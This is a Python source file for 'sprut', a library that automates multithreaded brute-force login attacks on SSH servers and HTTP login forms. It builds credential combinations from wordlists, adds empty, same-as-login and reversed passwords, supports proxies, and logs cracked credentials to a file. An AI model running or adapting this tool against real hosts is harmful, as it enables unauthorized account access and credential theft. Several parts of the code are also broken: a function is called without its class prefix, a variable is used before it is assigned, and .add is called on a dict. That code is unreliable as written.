'''
.. py:module:: sprut
.. moduleauthor:: Albert Farrakhov <cgfandia@gmail.com>

'''
import os
import sys
import socket
import threading
import copy
import codecs
import logging
import sys
import urllib
import time
from datetime import timedelta
from collections import Counter
from abc import ABCMeta, abstractmethod
# python 2-3 compatibility
try:
	import urllib.parse as urlparse
except ImportError:
	import urlparse
try:
	import queue
except ImportError:
	import Queue as queue

import paramiko
import requests

'''
Logging configurations
'''
class tclr:
	RED = '\033[31m'
	GREEN = '\033[32m'
	YELLOW = '\033[33m'
	BLUE = '\033[34m'
	END = '\033[0m'
	BOLD = '\033[1m'
	EBOLD = '\033[22m'
	ITALIC = '\033[3m'
	EITALIC = '\033[23m'
	UNDERLINE = '\033[4m'
	EUNDERLINE = '\033[24m'

# Disable paramiko logging
logging.getLogger('paramiko.transport').propagate = False
# Set SUCCESS level for logging
SUCCESS_LEVELV_NUM = 31
logging.addLevelName(SUCCESS_LEVELV_NUM, tclr.GREEN + "SUCCESS")
def success(self, message, *args, **kws):
	if self.isEnabledFor(SUCCESS_LEVELV_NUM):
		self._log(SUCCESS_LEVELV_NUM, message, args, **kws) 
logging.Logger.success = success
# Set FAIL level for logging
FAIL_LEVELV_NUM = 21
logging.addLevelName(FAIL_LEVELV_NUM, "FAIL")
def fail(self, message, *args, **kws):
	if self.isEnabledFor(FAIL_LEVELV_NUM):
		self._log(FAIL_LEVELV_NUM, message, args, **kws) 
logging.Logger.fail = fail

logfmt = tclr.BOLD + '%(levelname)s' + tclr.EBOLD + ' %(message)s' + tclr.END
logging.basicConfig(level='WARNING', format=logfmt, datefmt='%d/%m/%Y %H:%M:%S', stream=sys.stdout)
sprut_log = logging.getLogger('sprut')
logging.addLevelName( logging.WARNING, tclr.YELLOW + 'WARNING')
logging.addLevelName( logging.ERROR, tclr.RED  + 'ERROR')
logging.addLevelName( logging.CRITICAL, tclr.RED + 'CRITICAL')

'''
Sprut excpetions
'''
class SprutException(Exception):
	'''
	Base *sprut* exception
	'''
	pass

class AuthError(SprutException):
	'''
	Exception, which raised when can't authenticate
	'''
	pass

class ConnError(SprutException):
	'''
	Exception, which raised when can't connect to host
	'''
	def __init__(self, msg):
		super().__init__()
		self.msg = msg

	def __str__(self):
		return "Connection failed. {}".format(self.msg)

def get_lines_from_file(path):
	'''
	Read lines from file and return set of stripped lines.

	:param str path: path to file
	:return: ``set`` with unique values
	'''
	lines = set()
	with codecs.open(path, 'r', 'utf-8') as lines_file:
		for line in lines_file:
			lines.add(line.strip('\n\r'))
	return lines

class Service():
	'''
	Abstract class, that describe authentication method :py:meth:`.Service.__call__` 
	and other methods like :py:meth:`.Service.set_proxy`.

	:cvar float CONN_TIMEOUT: 10
	'''
	__metaclass__ = ABCMeta

	CONN_TIMEOUT = 10

	@abstractmethod
	def __call__(self, target, timeout=CONN_TIMEOUT):
		'''
		Service authentication realization.
		If success - return :py:class:`.Attemt` object.
		If authentication fail - raise :py:exc:`.AuthError`.
		If connection error - raise :py:exc:`.ConnError`.
		Another errors or exceptions - raise :py:exc:`.SprutException`.

		.. note::

			Signature have to contain ``target`` parameter.
			If you use timeout option, then set it by :py:attr:`.Service.CONN_TIMEOUT`.
			To check connection you can use :py:meth:`.check_connection`.

		Example:

			>>> class MyService(sprut.Service):
			...	def __init__(self):
			...		self.super().__init__()
			...	def __call__(self, target, login, password,
			...	port=777, timeout=Service.CONN_TIMEOUT):
			...		sprut.Service.check_connection(target, port, timeout)
			...		attempt = sprut.Attempt(target=target, login=login, password=password)
			...		if success:
			...			return attempt
			...		else:
			...			raise sprut.AuthError(attempt)
		'''

	def __init__(self):
		self._proxies = {}

	def __str__(self):
		return type(self).__name__ + ' service'

	# Proxy methods
	def set_proxy(self, protocol, host, port, user=None, password=None):
		if user is None or password is None:
			proxy = '{}://{}:{}'.format(protocol, host, port)
		else:
			proxy = '{}://{}:{}@{}:{}'.format(protocol, user, password, host, port)
		self._proxies[protocol] = proxy

	def unset_proxy(self, protocol):
		del self._proxies[protocol]

	@property
	def proxies(self):
		return self._proxies

	@proxies.setter
	def proxies(self, proxy):
		self._proxies.update(proxy)

	@staticmethod
	def check_connection(host, port, timeout=CONN_TIMEOUT):
		'''
		Checking connection to host by trying to create socket.
		If ``timeout`` exceeded, then :py:exc:`.ConnError` raised.

		:param host: target host
		:param port: port of host
		:param timeout: timeout in sec
		:raises ConnError: connection problems to host
		'''
		try:
			s = socket.create_connection((str(host),int(port)), int(timeout))
			s.close()
			return True
		except:
			raise ConnError(host + ':' + str(port))


class Attempt():
	'''
	Class that contain information about success or fail
	'''
	def __init__(self, *args, **kwargs):
		'''
		Init object by ``*args`` and ``**kwargs``

		Example:

			>>> attempt = Attempt(target, login='login', password='password')
		'''
		self._info = (args, kwargs)

	def __str__(self):
		write_string = ''
		for value in self._info[0]:
			write_string += str(value) + '\t'

		for key, value in self._info[1].items():
			write_string += '{}:"{}"\t'.format(str(key), str(value))
		return write_string

	@property
	def info(self):
		'''
		return tuple of ``*args`` and ``**kwargs``
		'''
		return self._info

class Ssh(Service):
	'''
	Class for SSH service
	'''
	def __init__(self):
		super().__init__()

	def __call__(self, target, login, password, 
		timeout=Service.CONN_TIMEOUT, port=22):	
		'''
		Try to log in ssh server with specified target, pass and sshd port.

		:param str target: target host
		:param str login: user login
		:param str password: user password
		:param int timeout: timeout in sec
		:param int port: port of host
		:return: Attempt object with: target, port, login and password
		:rtype: :py:class:`.Attempt`
		:raises ConnError: connection problems to target
		:raises AuthError: if authentication failed

		Example:

			>>> ssh = sprut.Ssh()
			>>> ssh('localhost','admin','pass')
		'''
		try:
			if port is None:
				port = 22
			check_connection(target, port, timeout)
			tr = paramiko.transport.Transport("{}:{}".format(target, port))
			tr.connect(username=login, password=password)
			tr.close()
			attempt = Attempt(port=port, target=target, login=login, password=password)			
			return attempt
		except paramiko.ssh_exception.AuthenticationException:
			raise AuthError(attempt)
		except paramiko.ssh_exception.SSHException as e:
			raise AuthError(e)

class HttpPost(Service):
	'''
	Class for HTTP-post service
	'''
	def __init__(self):
		super().__init__()

	def __call__(self, target, body, fail_msg=None,
	 success_msg=None, port=None, timeout=Service.CONN_TIMEOUT, **params):
		'''
		Send post request to target URL with body, where 
		using ``params``, specifing arguments. If ``params`` is 
		``login='admin', password='pass'``, then body should be like this: 
		``user=^login^&password=^password^&key=value``. 
		To recognize success or fail use ``fail_msg`` or ``success_msg`` 
		in response text.

		:param str target: target url
		:param str body: post body
		:param str fail_msg: fail phrase in response
		:param str success_msg: success phrase in response
		:param int timeout: timeout in sec
		:return: Attempt object with: ``target``, ``**params``
		:rtype: :py:class:`.Attempt`
		:raises ConnError: if cant connect to host or server response bad status
		:raises AuthError: if authentication failed
		:raises SprutException: ``fail_msg`` and ``success_msg`` is None \
		or ``Requests`` exceptions 

		Example:
		
			>>> httppost = sprut.HttpPost()
			>>> httppost(target='http://example.com/login',
			...	login='admin',
			...	password='pass',
			...	some_key='111111',
			...	body='user=^login^&pass=^password^&user_key=^some_key^',
			...	fail_msg='fail')
		'''
		try:
			url = urlparse.urlparse(target)
			if port is not None and url.port is None:
				url_tuple = list(url)
				url_tuple[1] = url.netloc + ':' + str(port)
				target = urlparse.urlunparse(url_tuple)

			for param, value in params.items():
				# python 2, 3 compatibility
				try:
					url_value = urlparse.quote(str(value))
				except AttributeError:
					url_value = urllib.quote(value.encode('utf8'))
					#print value
				body = body.replace('^{}^'.format(param), url_value)

			sprut_log.debug(body)
			data = tuple(urlparse.parse_qsl(body))
			response = requests.post(target, data, 
				timeout=(timeout, timeout * 10), proxies=self.proxies)

			if str(response.status_code)[0] != '2':
				raise ConnError('Response status: ' + 
					str(response.status_code)+' '+target) 
			if 'charset' in response.headers:				
				response.encoding = response.headers['charset']
			else:
				response.encoding = 'utf-8'
			#sprut_log.debug(response.text)
			attempt = Attempt(target=target, **params)
			if fail_msg is not None:
				if response.text.find(fail_msg) == -1:
					return attempt
				else:
					raise AuthError(attempt)
			elif success_msg is not None:
				if response.text.find(success_msg) != -1:
					return attempt
				else:
					raise AuthError(attempt)
			else:
				raise SprutException('fail_msg and success_msg is None')

		except requests.exceptions.ConnectionError as ce:
			raise ConnError(ce)
		except requests.exceptions.RequestException as se:
			raise SprutException(se)

class BruteForce(Service):
	'''
	:py:class:`.BruteForce` is a main class, which you can use to 
	automate brute-force attacks in your scripts.

	Example:

		>>> b = sprut.BruteForce()
		>>> b.init_tasks(...)
		>>> b.run(...)
	'''
	TIME_FMT = '%Y-%m-%d %H:%M:%S'
	def __init__(self):
		'''
		Initialization :py:attr:`_thread_sleep_increment` and 
		:py:attr:`._decrease_sleep_interval`. 
		:py:attr:`._thread_sleep_increment` is a time increment when 
		sever can't handle requests. 
		:py:attr:`._decrease_sleep_interval` - time in sec to wait 
		decrease thread sleep time.
		'''
		super().__init__()
		self._thread_sleep_increment = 1
		self._decrease_sleep_interval = 10

	def init_tasks(self, target, login=None, password=None, 
		null=False, same=False, reverse=False, **kwargs):
		'''
		Set queue with tasks by iterable object 
		of ``target``, which can be for example 
		host or url, ``login``, ``password`` and specified params 
		from ``kwargs``. Parameters ``null``, ``same`` and ``reverse`` 
		have the meaning if service using login-password authentication.

		.. important::

			Values in ``kwargs``, ``target``, 
			``login`` and ``password`` must be iterable object.

		:param iterable target: object with hosts or urls
		:param iterable login: object with logins
		:param iterable password: object with passwords
		:param bool null: if True, will be added password ''
		:param bool same: if True, will be added password same as login
		:param bool reverse: if True, will be added password as inversed login
		
		Example:

			>>> target = ['localhost', '192.168.1.1']
			>>> login = ['login', 'user']
			>>> password = ['1234', 'qwerty']
			>>> b = sprut.BruteForce()
			>>> b.init_targets(target=target, 
			... login=login, 
			... password=password, null=True, same=True)
		'''
		self._tasks = queue.Queue()
		task = {}
		values = []
		params = []
		for param, value in kwargs.items():
			params.append(param)
			values.append(value)
		if login is None and password is not None:
			params.append('password')
			values.append(password)
		elif login is not None and password is None:
			params.append('login')
			values.append(login)
		params.append('target')
		values.append(target)

		def params_recursion(depth=0):
			for value in values[depth]:
				task[params[depth]] = value
				if depth < len(params) - 1:
					current_depth = depth + 1
					params_recursion(current_depth)
				else:
					self._tasks.put(copy.copy(task), block=False)

		if login is not None and password is not None:
			for passw in password:
				task['password'] = passw
				for user in login:
					task['login'] = user
					params_recursion()
					if null:
						task['password'] = ''
						self._tasks.put(copy.copy(task), block=False)
					if same:
						task['password'] = user
						self._tasks.put(copy.copy(task), block=False)
					if reverse:
						task['password'] = user[::-1]
						self._tasks.put(copy.copy(task), block=False)
		else:
			params_recursion()

	def run(self, service, out_file=None, exclude_target=False, exclude_login=True,
		global_exit=False, threads_count=8, status=True, max_retries=float('inf')):
		'''
		This function starts the brute-force attack on
		initialized *tasks* by :py:meth:`.init_tasks`.

		:param service: service class (:py:class:`sprut.HttpPost`, \
:py:class:`sprut.Ssh`, etc)
		:type service: class type
		:param str out_file: absolute path to success file
		:param bool exclude_target: flag for excluding targets if success will be finded
		:param bool exclude_login: flag for excluding logins if success will be finded
		:param bool global_exit: exit from brute-force if will be finded success
		:param int threads_count: count of threads in brute-force attack
		:param bool status: show status information
		:param int max_retries: max connection retries to target
		:return: successes
		:rtype: list
		'''
		self._max_retries = max_retries
		self._exclude_target_flag = exclude_target
		self._exclude_login_flag = exclude_login
		self._global_exit = global_exit
		self._global_exit_flag = False
		self._time_shift = 0
		self._service = service
		self._threads_output = queue.Queue()
		self._success_list = []
		self._exclude_targets = {}
		self._targets_retries = Counter()
		self._exclude_logins = set()
		self._threads = []
		self._write_event = threading.Event()
		self._time_shift_lock = threading.Lock()
		self._end = False

		for i in range(threads_count):
			self._threads.append(threading.Thread(
				target=BruteForce._run_thread, args=(self, i)))
			self._threads[-1].setDaemon(True)
			self._threads[-1].start()

		decrease_sleep_thread = threading.Thread(
			target=BruteForce._decrease_sleep_time, args=(self,))
		decrease_sleep_thread.setDaemon(True)
		decrease_sleep_thread.start()

		if status:
			status_thread = threading.Thread(target=BruteForce._show_status, 
				args=(self,))
			status_thread.setDaemon(True)
			status_thread.start()

		self._write_success(out_file)
		print('WRITE DONE')
		#self._tasks.join()
		print('TASKS DONE')
		#self._threads_output.join()
		print('OUTPUT DONE')
		self._end = True
		sys.stdout.write(self._get_end_status())
		return self._success_list

	@property
	def success(self):
		return self._success_list
					
	def _clear_tasks_queue(self):
		while not self._tasks.empty():
			try:
				self._tasks.get(block=False)
				self._tasks.task_done()
			except:
				continue

	def _exit(self):
		'''
		Properly exit from attack process
		'''
		sprut_log.error('exit start!')
		#self._clear_tasks_queue()
		self._global_exit = True
		self._global_exit_flag = True


	def _get_start_status(self):
		fst_string = '~~~~~~~~~~~sprut~~~~~~~~~~~\n\
Attack on {}\nOveral tasks count: {}\nStart time: {}\n'
		service = self._service.__name__ + ' service'
		return fst_string.format(service, 
			self._tasks.qsize(), 
			time.strftime(BruteForce.TIME_FMT, time.localtime()))

	def _get_end_status(self):
		return 'Attack finished at {}\nSuccess: {}\n'.format(
			time.strftime(BruteForce.TIME_FMT, time.localtime()), 
			len(self._success_list))

	def _show_status(self):
		'''
		Show information about attack in real time
		'''
		overal_tasks = self._tasks.qsize()
		start_time = time.time()
		sys.stdout.write(self._get_start_status())
		status_sleep_time = 60
		task_sec = 0
		while not self._end:
			begin_tasks = self._tasks.qsize()
			time.sleep(status_sleep_time)
			end_tasks = self._tasks.qsize()
			elapsed_sec = int(time.time() - start_time)
			elapsed_time = str(timedelta(seconds=elapsed_sec))
			tasks_done = begin_tasks - end_tasks
			if tasks_done == 0:
				task_sec += status_sleep_time
			else:
				task_sec = status_sleep_time / tasks_done
			speed = int(tasks_done / status_sleep_time)
			done_sec = time.time() + self._tasks.qsize() * task_sec
			TIME_FMT = '%Y-%m-%d %H:%M:%S'
			status_string = '\n ~ [{}]\n ~ {GREEN}Success: {}{END}\n\
 ~ Tasks done: {}/{}\n ~ Elapsed time: {}\n ~ Speed: {} task/sec\n ~ End time: {}\n\n'
			sys.stdout.write(status_string.format(
				time.strftime(TIME_FMT, time.localtime()), 
				len(self._success_list),
				overal_tasks - self._tasks.qsize(), 
				overal_tasks, elapsed_time, speed, 
				time.strftime(TIME_FMT, time.localtime(done_sec)),				
				GREEN=tclr.GREEN,
				END=tclr.END))

	def _write_success(self, path):
		'''
		Write to text file success string by adding at 
		the end of file.
		'''
		try:
			if path is not None:
				with codecs.open(path, 'a', 'utf-8') as out_file:
					out_file.write(self._get_start_status())
			while True:
				if not self._threads_output.empty():
					try:
						success = self._threads_output.get(block=False)
						self._success_list.append(success)
						if path is not None:
							with codecs.open(path, 'a', 'utf-8') as out_file:
								out_file.write(str(success) + '\n')
					except Exception as e:
						self._exit()
						error = str(type(e).__name__) + ':' + str(e) 
						sprut_log.critical(error)
					finally:				
						self._threads_output.task_done()
				else:
					if all([not thread.is_alive() for thread in self._threads]):
						break			
			if path is not None:
				with codecs.open(path, 'a', 'utf-8') as out_file:
					out_file.write(self._get_end_status())	
		except (KeyboardInterrupt, SystemExit):
			if path is not None:
				with codecs.open(path, 'a', 'utf-8') as out_file:
					out_file.write(self._get_end_status())	
			self._exit()

	def _run_thread(self, t_id):
		'''
		Function that executing in every thread of brute-force attack.
		:param int t_id: thread id. Need to calculate thread sleep time 
		if server can't handle requests.
		'''
		try:
			while not self._tasks.empty():
				# clear tasks queue if success is finded and global_exit is True
				if self._global_exit and self._global_exit_flag:
					#self._clear_tasks_queue()
					break
				try:
					task = self._tasks.get(block=False)
					if task['target'] in self._exclude_targets:
						continue
					if 'login' in task:
						if task['login'] in self._exclude_logins:
							continue

					sprut_log.info(task)
					service = self._service()
					service.proxies = self.proxies
					success = service(**task)

					if self._exclude_target_flag:
						self._exclude_targets.add(task['target'])
					if self._exclude_login_flag and 'login' in task:
						self._exclude_logins.add(task['login'])

					self._threads_output.put(success, block=False)
					sprut_log.success(success)
					self._global_exit_flag = True
				except AuthError as ae:
					sprut_log.fail(ae)
				except ConnError as ce:
					sprut_log.warning(ce)
					self._time_shift_lock.acquire()
					self._targets_retries[task['target']] += 1
					if self._targets_retries[task['target']] > self._max_retries:
						self._exclude_targets.add(task['target'])
					self._time_shift += self._thread_sleep_increment
					self._time_shift_lock.release()
					self._tasks.put(task)
				except Exception as e:
					self._exit()
					error = str(type(e).__name__) + ':' + str(e) 
					sprut_log.error(error)
				finally:				
					self._tasks.task_done()
					# thread sleeping
					time.sleep(t_id * self._time_shift)

			self._global_exit_flag = True
		except (KeyboardInterrupt, SystemExit):
			self._exit()

	def _decrease_sleep_time(self):
		'''
		Pause to self._decrease_sleep_interval and then
		decreasing threads sleep time.
		It is necessary for load balancing to maximum performance.
		'''
		try:
			while not self._tasks.empty():
				if self._global_exit and self._global_exit_flag:
					break
				time.sleep(self._decrease_sleep_interval)
				self._time_shift_lock.acquire()
				self._time_shift = max(0, 
					self._time_shift - self._thread_sleep_increment)
				self._time_shift_lock.release()
		except (KeyboardInterrupt, SystemExit):
			self._exit()


